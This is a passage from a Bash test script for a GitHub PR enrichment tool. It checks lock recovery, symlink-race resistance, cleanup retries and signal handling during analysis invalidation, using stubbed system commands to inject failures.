"$GH_PR_ENRICH" --test-call invalidate_selected_analysis \
    "$MODE_INVALIDATION_DIR" >/dev/null 2>&1
assert_eq "640" \
    "$("$GH_PR_ENRICH" --test-call workspace_file_mode \
        "$MODE_INVALIDATION_DIR/comprehensive-report.md")" \
    "successful invalidation preserves the comprehensive report mode"
assert_eq "644" \
    "$("$GH_PR_ENRICH" --test-call workspace_file_mode \
        "$MODE_INVALIDATION_DIR/combined-data.json")" \
    "successful invalidation preserves an already-clean combined-data mode"
assert_jq "$MODE_INVALIDATION_DIR/combined-data.json" \
    '.base == "already clean" and (has("analysis") | not)' \
    "already-clean combined data remains valid after invalidation"

MARKER_FREE_DIR="$TEST_OUTPUT_DIR/marker-free-invalidation"
mkdir -p "$MARKER_FREE_DIR"
printf '%s\n' '# Marker-free base report' 'Base content must survive.' \
    > "$MARKER_FREE_DIR/comprehensive-report.md"
echo '{"selected":true}' > "$MARKER_FREE_DIR/analysis.json"
chmod 640 "$MARKER_FREE_DIR/comprehensive-report.md"
MARKER_FREE_BEFORE=$(cat "$MARKER_FREE_DIR/comprehensive-report.md")
"$GH_PR_ENRICH" --test-call invalidate_selected_analysis \
    "$MARKER_FREE_DIR" >/dev/null 2>&1
assert_eq "$MARKER_FREE_BEFORE" \
    "$(cat "$MARKER_FREE_DIR/comprehensive-report.md")" \
    "marker-free comprehensive base report survives invalidation unchanged"
assert_eq "640" \
    "$("$GH_PR_ENRICH" --test-call workspace_file_mode \
        "$MARKER_FREE_DIR/comprehensive-report.md")" \
    "marker-free comprehensive report keeps its original mode"
assert_true "$([ ! -e "$MARKER_FREE_DIR/analysis.json" ] && echo 0 || echo 1)" \
    "marker-free invalidation still removes the selected artifact"

# A live lock is never stolen. A lock whose well-formed owner PID has exited is
# atomically claimed, token-checked, and replaced so SIGKILL does not create a
# permanent report-directory blocker.
LOCK_RECOVERY_DIR="$TEST_OUTPUT_DIR/lock-recovery"
LOCK_RECOVERY_PATH="$LOCK_RECOVERY_DIR/.selected-analysis.lock"
mkdir -p "$LOCK_RECOVERY_PATH"
echo '{"selected":"live"}' > "$LOCK_RECOVERY_DIR/analysis.json"
printf '%s\n' "$$.1.1" > "$LOCK_RECOVERY_PATH/owner"
rc=0
"$GH_PR_ENRICH" --test-call invalidate_selected_analysis \
    "$LOCK_RECOVERY_DIR" >/dev/null 2>&1 || rc=$?
assert_true "$([ "$rc" -ne 0 ] && echo 0 || echo 1)" \
    "a live selected-analysis lock owner is never displaced"
assert_eq "$$.1.1" "$(cat "$LOCK_RECOVERY_PATH/owner")" \
    "live lock refusal preserves the recorded owner"
rm "$LOCK_RECOVERY_PATH/owner"
rmdir "$LOCK_RECOVERY_PATH"
STALE_LOCK_PID=999999
while kill -0 "$STALE_LOCK_PID" 2>/dev/null; do
    STALE_LOCK_PID=$((STALE_LOCK_PID - 1))
done
mkdir "$LOCK_RECOVERY_PATH"
printf '%s\n' "$STALE_LOCK_PID.1.1" > "$LOCK_RECOVERY_PATH/owner"
"$GH_PR_ENRICH" --test-call invalidate_selected_analysis \
    "$LOCK_RECOVERY_DIR" >/dev/null 2>&1
assert_true "$([ ! -e "$LOCK_RECOVERY_PATH" ] && echo 0 || echo 1)" \
    "a dead owner's selected-analysis lock is recovered and released"
assert_true "$([ ! -e "$LOCK_RECOVERY_DIR/analysis.json" ] && echo 0 || echo 1)" \
    "stale-lock recovery allows the selected-analysis transaction to complete"

# A one-shot rmdir failure after stale-owner unlink leaves an authenticated,
# empty recovery directory. The next preflight may safely rmdir only that exact
# empty shape, then proceed normally.
STALE_RMDIR_DIR="$TEST_OUTPUT_DIR/stale-rmdir"
STALE_RMDIR_STUBS="$TEST_OUTPUT_DIR/stale-rmdir-stubs"
STALE_RMDIR_MARKER="$TEST_OUTPUT_DIR/stale-rmdir-fired"
mkdir -p "$STALE_RMDIR_DIR/.selected-analysis.lock" "$STALE_RMDIR_STUBS"
echo '{"selected":"stale-rmdir"}' > "$STALE_RMDIR_DIR/analysis.json"
printf '%s\n' "$STALE_LOCK_PID.2.2" \
    > "$STALE_RMDIR_DIR/.selected-analysis.lock/owner"
cat > "$STALE_RMDIR_STUBS/rmdir" << 'STUB'
#!/bin/bash
case "$1" in
    "$STALE_RMDIR_REPORT"/.selected-analysis-stale.*)
        if [ ! -f "$STALE_RMDIR_MARKER" ]; then
            : > "$STALE_RMDIR_MARKER"
            exit 77
        fi
        ;;
esac
exec "$REAL_RMDIR" "$@"
STUB
chmod +x "$STALE_RMDIR_STUBS/rmdir"
rc=0
env PATH="$STALE_RMDIR_STUBS:$PATH" REAL_RMDIR="$(command -v rmdir)" \
    STALE_RMDIR_REPORT="$STALE_RMDIR_DIR" \
    STALE_RMDIR_MARKER="$STALE_RMDIR_MARKER" \
    "$GH_PR_ENRICH" --test-call invalidate_selected_analysis \
    "$STALE_RMDIR_DIR" >/dev/null 2>&1 || rc=$?
assert_true "$([ "$rc" -ne 0 ] && [ -f "$STALE_RMDIR_MARKER" ] && \
    echo 0 || echo 1)" \
    "stale-lock recovery reports a transient claimed-directory rmdir failure"
STALE_RMDIR_RESIDUE=$(find "$STALE_RMDIR_DIR" -maxdepth 1 \
    -name '.selected-analysis-stale.*' -print -quit)
assert_true "$([ -d "$STALE_RMDIR_RESIDUE" ] && \
    ! find "$STALE_RMDIR_RESIDUE" -mindepth 1 -print -quit | grep -q . && \
    echo 0 || echo 1)" \
    "failed stale cleanup preserves only an empty authenticated residue"
"$GH_PR_ENRICH" --test-call invalidate_selected_analysis \
    "$STALE_RMDIR_DIR" >/dev/null 2>&1
assert_true "$([ ! -e "$STALE_RMDIR_DIR/analysis.json" ] && \
    ! find "$STALE_RMDIR_DIR" -maxdepth 1 \
        -name '.selected-analysis-stale.*' -print -quit | grep -q . && \
    echo 0 || echo 1)" \
    "the next writer safely recovers an empty stale-rmdir residue"

echo '{"selected":"ownerless"}' > "$LOCK_RECOVERY_DIR/analysis.json"
mkdir "$LOCK_RECOVERY_PATH"
rc=0
"$GH_PR_ENRICH" --test-call invalidate_selected_analysis \
    "$LOCK_RECOVERY_DIR" >/dev/null 2>&1 || rc=$?
assert_true "$([ "$rc" -ne 0 ] && echo 0 || echo 1)" \
    "a fresh ownerless lock keeps the acquisition grace period"
assert_true "$([ -d "$LOCK_RECOVERY_PATH" ] && \
    [ -f "$LOCK_RECOVERY_DIR/analysis.json" ] && echo 0 || echo 1)" \
    "fresh ownerless lock refusal preserves the lock and selected artifact"
touch -t 200001010000 "$LOCK_RECOVERY_PATH"
"$GH_PR_ENRICH" --test-call invalidate_selected_analysis \
    "$LOCK_RECOVERY_DIR" >/dev/null 2>&1
assert_true "$([ ! -e "$LOCK_RECOVERY_PATH" ] && \
    [ ! -e "$LOCK_RECOVERY_DIR/analysis.json" ] && echo 0 || echo 1)" \
    "an old empty ownerless lock is recovered after the bounded grace period"

# A pathname planted between mkdir and the owner write cannot redirect the
# lock token through a symlink. Noclobber must fail and preserve the target.
OWNER_RACE_DIR="$TEST_OUTPUT_DIR/owner-record-race"
OWNER_RACE_STUBS="$TEST_OUTPUT_DIR/owner-record-race-stubs"
OWNER_RACE_TARGET="$TEST_OUTPUT_DIR/owner-record-race-target"
mkdir -p "$OWNER_RACE_DIR" "$OWNER_RACE_STUBS"
echo '{"selected":"owner-race"}' > "$OWNER_RACE_DIR/analysis.json"
printf '%s\n' external-sentinel > "$OWNER_RACE_TARGET"
cat > "$OWNER_RACE_STUBS/mkdir" << 'STUB'
#!/bin/bash
"$REAL_MKDIR" "$@" || exit $?
for candidate in "$@"; do
    if [ "$candidate" = "$OWNER_RACE_LOCK" ]; then
        ln -s "$OWNER_RACE_TARGET" "$candidate/owner"
    fi
done
STUB
chmod +x "$OWNER_RACE_STUBS/mkdir"
rc=0
OWNER_RACE_OUT=$(env PATH="$OWNER_RACE_STUBS:$PATH" \
    REAL_MKDIR="$(command -v mkdir)" \
    OWNER_RACE_LOCK="$OWNER_RACE_DIR/.selected-analysis.lock" \
    OWNER_RACE_TARGET="$OWNER_RACE_TARGET" \
    "$GH_PR_ENRICH" --test-call invalidate_selected_analysis \
    "$OWNER_RACE_DIR" 2>&1) || rc=$?
assert_true "$([ "$rc" -ne 0 ] && echo 0 || echo 1)" \
    "lock owner creation fails closed on a planted symlink"
assert_eq "external-sentinel" "$(cat "$OWNER_RACE_TARGET")" \
    "noclobber owner creation never follows the planted symlink"
assert_contains "$OWNER_RACE_OUT" "changed while its owner was recorded" \
    "the owner-record race reports a lock integrity failure"
rm "$OWNER_RACE_DIR/.selected-analysis.lock/owner"
rmdir "$OWNER_RACE_DIR/.selected-analysis.lock"

echo '{"selected":"malformed-lock"}' > "$LOCK_RECOVERY_DIR/analysis.json"
mkdir "$LOCK_RECOVERY_PATH"
echo unexpected > "$LOCK_RECOVERY_PATH/extra"
touch -t 200001010000 "$LOCK_RECOVERY_PATH"
rc=0
"$GH_PR_ENRICH" --test-call invalidate_selected_analysis \
    "$LOCK_RECOVERY_DIR" >/dev/null 2>&1 || rc=$?
assert_true "$([ "$rc" -ne 0 ] && echo 0 || echo 1)" \
    "an old ownerless lock with extra content remains malformed"
assert_true "$([ -f "$LOCK_RECOVERY_PATH/extra" ] && \
    [ -f "$LOCK_RECOVERY_DIR/analysis.json" ] && echo 0 || echo 1)" \
    "malformed ownerless lock recovery preserves every existing path"
rm "$LOCK_RECOVERY_PATH/extra"
rmdir "$LOCK_RECOVERY_PATH"
rm "$LOCK_RECOVERY_DIR/analysis.json"

RECOVERY_RESIDUE_DIR="$TEST_OUTPUT_DIR/recovery-residue"
RECOVERY_RESIDUE_PATH="$RECOVERY_RESIDUE_DIR/.selected-analysis-quarantine.manual"
mkdir -p "$RECOVERY_RESIDUE_PATH"
echo '{"selected":"residue"}' > "$RECOVERY_RESIDUE_DIR/analysis.json"
rc=0
RECOVERY_RESIDUE_OUT=$("$GH_PR_ENRICH" --test-call \
    invalidate_selected_analysis "$RECOVERY_RESIDUE_DIR" 2>&1) || rc=$?
assert_true "$([ "$rc" -ne 0 ] && echo 0 || echo 1)" \
    "a prior selected-analysis quarantine blocks every new writer"
assert_contains "$RECOVERY_RESIDUE_OUT" "$RECOVERY_RESIDUE_PATH" \
    "recovery-residue refusal names the manual reconciliation path"
assert_true "$([ -f "$RECOVERY_RESIDUE_DIR/analysis.json" ] && \
    [ -d "$RECOVERY_RESIDUE_PATH" ] && echo 0 || echo 1)" \
    "recovery-residue refusal preserves the selected view and quarantine"

# Publication is not reported as successful until the cooperative lock is
# released. A one-time owner-removal failure is surfaced, returns nonzero, and
# the EXIT retry reaps the lock instead of silently blocking future writers.
LOCK_RELEASE_DIR="$TEST_OUTPUT_DIR/invalidation-lock-release"
LOCK_RELEASE_STUBS="$TEST_OUTPUT_DIR/invalidation-lock-release-stubs"
LOCK_RELEASE_MARKER="$TEST_OUTPUT_DIR/invalidation-lock-release-fired"
mkdir -p "$LOCK_RELEASE_DIR" "$LOCK_RELEASE_STUBS"
echo '{"selected":"release"}' > "$LOCK_RELEASE_DIR/analysis.json"
cat > "$LOCK_RELEASE_STUBS/rm" << 'STUB'
#!/bin/bash
for candidate in "$@"; do
    case "$candidate" in
        "$LOCK_RELEASE_REPORT"/.selected-analysis-release.*/owner)
            if [ ! -f "$LOCK_RELEASE_MARKER" ]; then
                : > "$LOCK_RELEASE_MARKER"
                exit 79
            fi
            ;;
    esac
done
exec "$REAL_RM" "$@"
STUB
chmod +x "$LOCK_RELEASE_STUBS/rm"
rc=0
LOCK_RELEASE_OUT=$(env PATH="$LOCK_RELEASE_STUBS:$PATH" \
    REAL_RM="$(command -v rm)" \
    LOCK_RELEASE_REPORT="$LOCK_RELEASE_DIR" \
    LOCK_RELEASE_MARKER="$LOCK_RELEASE_MARKER" \
    "$GH_PR_ENRICH" --test-call invalidate_selected_analysis \
    "$LOCK_RELEASE_DIR" 2>&1) || rc=$?
assert_true "$([ "$rc" -ne 0 ] && echo 0 || echo 1)" \
    "invalidation propagates a writer-lock release failure"
assert_contains "$LOCK_RELEASE_OUT" \
    "invalidation was published, but its writer lock could not be released" \
    "invalidation reports the post-publication lock-release failure"
assert_true "$([ -f "$LOCK_RELEASE_MARKER" ] && \
    [ ! -e "$LOCK_RELEASE_DIR/.selected-analysis.lock" ] && echo 0 || echo 1)" \
    "invalidation EXIT cleanup retries and removes a transient failed lock"
assert_true "$([ ! -e "$LOCK_RELEASE_DIR/analysis.json" ] && echo 0 || echo 1)" \
    "lock-release failure does not misrepresent the already-published invalidation"

# If owner removal succeeds but the claimed directory rmdir fails once, EXIT
# cleanup resumes the deterministic authenticated release path and leaves no
# permanent writer blocker.
RELEASE_RMDIR_DIR="$TEST_OUTPUT_DIR/release-rmdir"
RELEASE_RMDIR_STUBS="$TEST_OUTPUT_DIR/release-rmdir-stubs"
RELEASE_RMDIR_MARKER="$TEST_OUTPUT_DIR/release-rmdir-fired"
mkdir -p "$RELEASE_RMDIR_DIR" "$RELEASE_RMDIR_STUBS"
echo '{"selected":"release-rmdir"}' > "$RELEASE_RMDIR_DIR/analysis.json"
cat > "$RELEASE_RMDIR_STUBS/rmdir" << 'STUB'
#!/bin/bash
case "$1" in
    "$RELEASE_RMDIR_REPORT"/.selected-analysis-release.*)
        if [ ! -f "$RELEASE_RMDIR_MARKER" ]; then
            : > "$RELEASE_RMDIR_MARKER"
            exit 78
        fi
        ;;
esac
exec "$REAL_RMDIR" "$@"
STUB
chmod +x "$RELEASE_RMDIR_STUBS/rmdir"
rc=0
RELEASE_RMDIR_OUT=$(env PATH="$RELEASE_RMDIR_STUBS:$PATH" \
    REAL_RMDIR="$(command -v rmdir)" \
    RELEASE_RMDIR_REPORT="$RELEASE_RMDIR_DIR" \
    RELEASE_RMDIR_MARKER="$RELEASE_RMDIR_MARKER" \
    "$GH_PR_ENRICH" --test-call invalidate_selected_analysis \
    "$RELEASE_RMDIR_DIR" 2>&1) || rc=$?
assert_true "$([ "$rc" -ne 0 ] && echo 0 || echo 1)" \
    "invalidation reports a transient claimed-lock rmdir failure"
assert_contains "$RELEASE_RMDIR_OUT" "claimed lock directory" \
    "claimed-lock rmdir failure is diagnostic"
assert_true "$([ -f "$RELEASE_RMDIR_MARKER" ] && \
    [ ! -e "$RELEASE_RMDIR_DIR/.selected-analysis.lock" ] && \
    ! find "$RELEASE_RMDIR_DIR" -maxdepth 1 \
        -name '.selected-analysis-release.*' -print -quit | grep -q . && \
    echo 0 || echo 1)" \
    "EXIT cleanup removes an authenticated ownerless release residue"
echo '{"selected":"next-writer"}' > "$RELEASE_RMDIR_DIR/analysis.json"
"$GH_PR_ENRICH" --test-call invalidate_selected_analysis \
    "$RELEASE_RMDIR_DIR" >/dev/null 2>&1
assert_true "$([ ! -e "$RELEASE_RMDIR_DIR/analysis.json" ] && echo 0 || echo 1)" \
    "a later writer proceeds after release-rmdir retry cleanup"

# A release residue is untrusted report-directory state. Even when its owner
# token matches the live lock, a symlink must never redirect release cleanup
# outside the report directory.
RELEASE_SYMLINK_DIR="$TEST_OUTPUT_DIR/release-symlink"
RELEASE_SYMLINK_STUBS="$TEST_OUTPUT_DIR/release-symlink-stubs"
RELEASE_SYMLINK_TARGET="$TEST_OUTPUT_DIR/release-symlink-target"
RELEASE_SYMLINK_MARKER="$TEST_OUTPUT_DIR/release-symlink-fired"
mkdir -p "$RELEASE_SYMLINK_DIR" "$RELEASE_SYMLINK_STUBS" \
    "$RELEASE_SYMLINK_TARGET"
echo '{"selected":"release-symlink"}' > "$RELEASE_SYMLINK_DIR/analysis.json"
cat > "$RELEASE_SYMLINK_STUBS/cp" << 'STUB'
#!/bin/bash
"$REAL_CP" "$@" || exit $?
if [ ! -f "$RELEASE_SYMLINK_MARKER" ]; then
    : > "$RELEASE_SYMLINK_MARKER"
    release_token=$(cat "$RELEASE_SYMLINK_REPORT/.selected-analysis.lock/owner")
    cat "$RELEASE_SYMLINK_REPORT/.selected-analysis.lock/owner" \
        > "$RELEASE_SYMLINK_TARGET/owner"
    ln -s "$RELEASE_SYMLINK_TARGET" \
        "$RELEASE_SYMLINK_REPORT/.selected-analysis-release.$release_token"
fi
STUB
chmod +x "$RELEASE_SYMLINK_STUBS/cp"
rc=0
RELEASE_SYMLINK_OUT=$(env PATH="$RELEASE_SYMLINK_STUBS:$PATH" \
    REAL_CP="$(command -v cp)" \
    RELEASE_SYMLINK_REPORT="$RELEASE_SYMLINK_DIR" \
    RELEASE_SYMLINK_TARGET="$RELEASE_SYMLINK_TARGET" \
    RELEASE_SYMLINK_MARKER="$RELEASE_SYMLINK_MARKER" \
    "$GH_PR_ENRICH" --test-call invalidate_selected_analysis \
    "$RELEASE_SYMLINK_DIR" 2>&1) || rc=$?
assert_true "$([ "$rc" -ne 0 ] && echo 0 || echo 1)" \
    "release rejects a matching-token symlink residue"
assert_contains "$RELEASE_SYMLINK_OUT" \
    "Unsafe selected-analysis release residue" \
    "unsafe release residue reports manual reconciliation"
RELEASE_SYMLINK_RESIDUE=$(find "$RELEASE_SYMLINK_DIR" -maxdepth 1 \
    -name '.selected-analysis-release.*' -print -quit)
assert_true "$([ -f "$RELEASE_SYMLINK_TARGET/owner" ] && \
    [ -L "$RELEASE_SYMLINK_RESIDUE" ] && \
    echo 0 || echo 1)" \
    "release residue validation leaves the external symlink target untouched"
rm "$RELEASE_SYMLINK_RESIDUE"
rm "$RELEASE_SYMLINK_TARGET/owner"
rm "$RELEASE_SYMLINK_DIR/.selected-analysis.lock/owner"
rmdir "$RELEASE_SYMLINK_DIR/.selected-analysis.lock"

# A real matching-token residue is not a resumable release while the original
# lock still exists. Both paths are preserved for manual reconciliation.
RELEASE_DUPLICATE_DIR="$TEST_OUTPUT_DIR/release-duplicate"
RELEASE_DUPLICATE_STUBS="$TEST_OUTPUT_DIR/release-duplicate-stubs"
RELEASE_DUPLICATE_MARKER="$TEST_OUTPUT_DIR/release-duplicate-fired"
mkdir -p "$RELEASE_DUPLICATE_DIR" "$RELEASE_DUPLICATE_STUBS"
echo '{"selected":"release-duplicate"}' > "$RELEASE_DUPLICATE_DIR/analysis.json"
cat > "$RELEASE_DUPLICATE_STUBS/cp" << 'STUB'
#!/bin/bash
"$REAL_CP" "$@" || exit $?
if [ ! -f "$RELEASE_DUPLICATE_MARKER" ]; then
    : > "$RELEASE_DUPLICATE_MARKER"
    release_token=$(cat "$RELEASE_DUPLICATE_REPORT/.selected-analysis.lock/owner")
    release_dir="$RELEASE_DUPLICATE_REPORT/.selected-analysis-release.$release_token"
    mkdir "$release_dir"
    cp "$RELEASE_DUPLICATE_REPORT/.selected-analysis.lock/owner" \
        "$release_dir/owner"
fi
STUB
chmod +x "$RELEASE_DUPLICATE_STUBS/cp"
rc=0
RELEASE_DUPLICATE_OUT=$(env PATH="$RELEASE_DUPLICATE_STUBS:$PATH" \
    REAL_CP="$(command -v cp)" \
    RELEASE_DUPLICATE_REPORT="$RELEASE_DUPLICATE_DIR" \
    RELEASE_DUPLICATE_MARKER="$RELEASE_DUPLICATE_MARKER" \
    "$GH_PR_ENRICH" --test-call invalidate_selected_analysis \
    "$RELEASE_DUPLICATE_DIR" 2>&1) || rc=$?
assert_true "$([ "$rc" -ne 0 ] && echo 0 || echo 1)" \
    "release refuses a matching-token residue beside the active lock"
assert_contains "$RELEASE_DUPLICATE_OUT" "beside the active writer lock" \
    "duplicate release state is reported for manual reconciliation"
RELEASE_DUPLICATE_RESIDUE=$(find "$RELEASE_DUPLICATE_DIR" -maxdepth 1 \
    -name '.selected-analysis-release.*' -print -quit)
assert_true "$([ -f "$RELEASE_DUPLICATE_DIR/.selected-analysis.lock/owner" ] && \
    [ -f "$RELEASE_DUPLICATE_RESIDUE/owner" ] && \
    echo 0 || echo 1)" \
    "duplicate release refusal preserves both ownership records"
rm "$RELEASE_DUPLICATE_RESIDUE/owner"
rmdir "$RELEASE_DUPLICATE_RESIDUE"
rm "$RELEASE_DUPLICATE_DIR/.selected-analysis.lock/owner"
rmdir "$RELEASE_DUPLICATE_DIR/.selected-analysis.lock"

# Release no longer discovers residues through an unobservable process
# substitution. A later directory-enumeration failure after atomic claim is
# visible and preserves the claimed lock for recovery.
RELEASE_FIND_DIR="$TEST_OUTPUT_DIR/release-find-failure"
RELEASE_FIND_STUBS="$TEST_OUTPUT_DIR/release-find-failure-stubs"
RELEASE_FIND_MARKER="$TEST_OUTPUT_DIR/release-find-claimed"
mkdir -p "$RELEASE_FIND_DIR" "$RELEASE_FIND_STUBS"
echo '{"selected":"release-find"}' > "$RELEASE_FIND_DIR/analysis.json"
cat > "$RELEASE_FIND_STUBS/mv" << 'STUB'
#!/bin/bash
"$REAL_MV" "$@" || exit $?
case "$2" in
    "$RELEASE_FIND_REPORT"/.selected-analysis-release.*)
        : > "$RELEASE_FIND_MARKER"
        ;;
esac
STUB
cat > "$RELEASE_FIND_STUBS/find" << 'STUB'
#!/bin/bash
if [ -f "$RELEASE_FIND_MARKER" ]; then
    exit 74
fi
exec "$REAL_FIND" "$@"
STUB
chmod +x "$RELEASE_FIND_STUBS/mv" "$RELEASE_FIND_STUBS/find"
rc=0
RELEASE_FIND_OUT=$(env PATH="$RELEASE_FIND_STUBS:$PATH" \
    REAL_MV="$(command -v mv)" REAL_FIND="$(command -v find)" \
    RELEASE_FIND_REPORT="$RELEASE_FIND_DIR" \
    RELEASE_FIND_MARKER="$RELEASE_FIND_MARKER" \
    "$GH_PR_ENRICH" --test-call invalidate_selected_analysis \
    "$RELEASE_FIND_DIR" 2>&1) || rc=$?
assert_true "$([ "$rc" -ne 0 ] && echo 0 || echo 1)" \
    "release fails closed when claimed-directory enumeration fails"
assert_contains "$RELEASE_FIND_OUT" "unexpected content" \
    "release enumeration failure is reported instead of silently succeeding"
RELEASE_FIND_RESIDUE=$(find "$RELEASE_FIND_DIR" -maxdepth 1 \
    -name '.selected-analysis-release.*' -print -quit)
assert_true "$([ -n "$RELEASE_FIND_RESIDUE" ] && \
    [ -f "$RELEASE_FIND_RESIDUE/owner" ] && echo 0 || echo 1)" \
    "release enumeration failure preserves the atomically claimed lock"
rm "$RELEASE_FIND_RESIDUE/owner"
rmdir "$RELEASE_FIND_RESIDUE"

# The lock token belongs to the actual Bash 3.2 transaction subshell, not the
# top-level script PID. Killing only the top-level caller cannot make another
# writer steal the lease while the transaction worker remains active.
WORKER_OWNER_DIR="$TEST_OUTPUT_DIR/actual-worker-owner"
WORKER_OWNER_STUBS="$TEST_OUTPUT_DIR/actual-worker-owner-stubs"
WORKER_OWNER_READY="$TEST_OUTPUT_DIR/actual-worker-owner.ready"
WORKER_OWNER_RELEASE="$TEST_OUTPUT_DIR/actual-worker-owner.release"
mkdir -p "$WORKER_OWNER_DIR" "$WORKER_OWNER_STUBS"
echo '{"selected":"worker"}' > "$WORKER_OWNER_DIR/analysis.json"
cat > "$WORKER_OWNER_STUBS/cp" << 'STUB'
#!/bin/bash
"$REAL_CP" "$@" || exit $?
copy_source=""
previous=""
for argument in "$@"; do
    copy_source="$previous"
    previous="$argument"
done
if [ "$copy_source" = "$WORKER_OWNER_SOURCE" ]; then
    : > "$WORKER_OWNER_READY"
    while [ ! -f "$WORKER_OWNER_RELEASE" ]; do /bin/sleep 0.02; done
fi
STUB
chmod +x "$WORKER_OWNER_STUBS/cp"
env PATH="$WORKER_OWNER_STUBS:$PATH" REAL_CP="$(command -v cp)" \
    WORKER_OWNER_SOURCE="$WORKER_OWNER_DIR/analysis.json" \
    WORKER_OWNER_READY="$WORKER_OWNER_READY" \
    WORKER_OWNER_RELEASE="$WORKER_OWNER_RELEASE" \
    "$GH_PR_ENRICH" --test-call invalidate_selected_analysis \
    "$WORKER_OWNER_DIR" > "$TEST_OUTPUT_DIR/actual-worker-owner.out" 2>&1 &
WORKER_TOP_PID=$!
for _ in $(seq 1 200); do
    [ -f "$WORKER_OWNER_READY" ] && break
    /bin/sleep 0.01
done
WORKER_OWNER_TOKEN=$(cat "$WORKER_OWNER_DIR/.selected-analysis.lock/owner")
WORKER_OWNER_PID=${WORKER_OWNER_TOKEN%%.*}
assert_true "$([ "$WORKER_OWNER_PID" != "$WORKER_TOP_PID" ] && \
    kill -0 "$WORKER_OWNER_PID" 2>/dev/null && echo 0 || echo 1)" \
    "selected-analysis lock ownership follows the live transaction worker"
kill -TERM "$WORKER_TOP_PID" 2>/dev/null || true
/bin/sleep 0.05
rc=0
WORKER_CONTENDER_OUT=$("$GH_PR_ENRICH" --test-call \
    invalidate_selected_analysis "$WORKER_OWNER_DIR" 2>&1) || rc=$?
assert_true "$([ "$rc" -ne 0 ] && echo 0 || echo 1)" \
    "a contender cannot stale-recover after only the top-level caller dies"
assert_contains "$WORKER_CONTENDER_OUT" "Another selected-analysis writer is active" \
    "the live worker lease is recognized as active after top-level termination"
: > "$WORKER_OWNER_RELEASE"
wait "$WORKER_TOP_PID" 2>/dev/null || true
for _ in $(seq 1 200); do
    [ ! -e "$WORKER_OWNER_DIR/.selected-analysis.lock" ] && break
    /bin/sleep 0.01
done
assert_true "$([ ! -e "$WORKER_OWNER_DIR/.selected-analysis.lock" ] && echo 0 || echo 1)" \
    "the surviving transaction worker releases its lease on completion"

# A signal delivered to the transaction worker is deferred until the current
# copy returns, then surfaced as 143 before any selected views are published.
WORKER_CANCEL_DIR="$TEST_OUTPUT_DIR/worker-cancellation"
WORKER_CANCEL_STUBS="$TEST_OUTPUT_DIR/worker-cancellation-stubs"
WORKER_CANCEL_MARKER="$TEST_OUTPUT_DIR/worker-cancellation-fired"
mkdir -p "$WORKER_CANCEL_DIR" "$WORKER_CANCEL_STUBS"
echo '{"selected":"cancel"}' > "$WORKER_CANCEL_DIR/analysis.json"
cat > "$WORKER_CANCEL_STUBS/cp" << 'STUB'
#!/bin/bash
"$REAL_CP" "$@" || exit $?
copy_source=""
previous=""
for argument in "$@"; do
    copy_source="$previous"
    previous="$argument"
done
if [ "$copy_source" = "$WORKER_CANCEL_SOURCE" ] && \
   [ ! -f "$WORKER_CANCEL_MARKER" ]; then
    : > "$WORKER_CANCEL_MARKER"
    kill -TERM "$PPID"
fi
STUB
chmod +x "$WORKER_CANCEL_STUBS/cp"
rc=0
env PATH="$WORKER_CANCEL_STUBS:$PATH" REAL_CP="$(command -v cp)" \
    WORKER_CANCEL_SOURCE="$WORKER_CANCEL_DIR/analysis.json" \
    WORKER_CANCEL_MARKER="$WORKER_CANCEL_MARKER" \
    "$GH_PR_ENRICH" --test-call invalidate_selected_analysis \
    "$WORKER_CANCEL_DIR" >/dev/null 2>&1 || rc=$?
assert_eq "143" "$rc" \
    "transaction-worker TERM is propagated after reaching a safe boundary"
assert_true "$([ -f "$WORKER_CANCEL_DIR/analysis.json" ] && \
    [ ! -e "$WORKER_CANCEL_DIR/.selected-analysis.lock" ] && echo 0 || echo 1)" \
    "cancelled invalidation preserves selected bytes and releases its lease"

# Publisher signals retain their conventional status. INT during quarantine
# rolls back the original bytes; TERM after the final quarantine cleanup
# reports cancellation without misrepresenting the coherent committed state.
PUBLISH_INT_DIR="$TEST_OUTPUT_DIR/publisher-int"
PUBLISH_INT_STUBS="$TEST_OUTPUT_DIR/publisher-int-stubs"
PUBLISH_INT_MARKER="$TEST_OUTPUT_DIR/publisher-int-fired"
mkdir -p "$PUBLISH_INT_DIR" "$PUBLISH_INT_STUBS"
echo '{"selected":"publisher-int"}' > "$PUBLISH_INT_DIR/analysis.json"
cat > "$PUBLISH_INT_STUBS/mv" << 'STUB'
#!/bin/bash
"$REAL_MV" "$@" || exit $?
if [ "$1" = "$PUBLISH_INT_SOURCE" ] && [ ! -f "$PUBLISH_INT_MARKER" ]; then
    : > "$PUBLISH_INT_MARKER"
    kill -INT "$PPID"
fi
STUB
chmod +x "$PUBLISH_INT_STUBS/mv"
rc=0
env PATH="$PUBLISH_INT_STUBS:$PATH" REAL_MV="$(command -v mv)" \
    PUBLISH_INT_SOURCE="$PUBLISH_INT_DIR/analysis.json" \
    PUBLISH_INT_MARKER="$PUBLISH_INT_MARKER" \
    "$GH_PR_ENRICH" --test-call invalidate_selected_analysis \
    "$PUBLISH_INT_DIR" >/dev/null 2>&1 || rc=$?
assert_eq "130" "$rc" \
    "publisher INT rollback preserves the direct cancellation status"
assert_true "$([ -f "$PUBLISH_INT_DIR/analysis.json" ] && \
    [ ! -e "$PUBLISH_INT_DIR/.selected-analysis.lock" ] && echo 0 || echo 1)" \
    "publisher INT restores selected bytes and releases its lease"

PUBLISH_TERM_DIR="$TEST_OUTPUT_DIR/publisher-term"
PUBLISH_TERM_STUBS="$TEST_OUTPUT_DIR/publisher-term-stubs"
PUBLISH_TERM_MARKER="$TEST_OUTPUT_DIR/publisher-term-fired"
mkdir -p "$PUBLISH_TERM_DIR" "$PUBLISH_TERM_STUBS"
echo '{"selected":"publisher-term"}' > "$PUBLISH_TERM_DIR/analysis.json"
cat > "$PUBLISH_TERM_STUBS/rm" << 'STUB'
#!/bin/bash
matched=false
for candidate in "$@"; do
    case "$candidate" in
        "$PUBLISH_TERM_REPORT"/.selected-analysis-quarantine.*) matched=true ;;
    esac
done
"$REAL_RM" "$@" || exit $?
if [ "$matched" = true ] && [ ! -f "$PUBLISH_TERM_MARKER" ]; then
    : > "$PUBLISH_TERM_MARKER"
    kill -TERM "$PPID"
fi
STUB
chmod +x "$PUBLISH_TERM_STUBS/rm"
rc=0
env PATH="$PUBLISH_TERM_STUBS:$PATH" REAL_RM="$(command -v rm)" \
    PUBLISH_TERM_REPORT="$PUBLISH_TERM_DIR" \
    PUBLISH_TERM_MARKER="$PUBLISH_TERM_MARKER" \
    "$GH_PR_ENRICH" --test-call invalidate_selected_analysis \
    "$PUBLISH_TERM_DIR" >/dev/null 2>&1 || rc=$?
assert_eq "143" "$rc" \
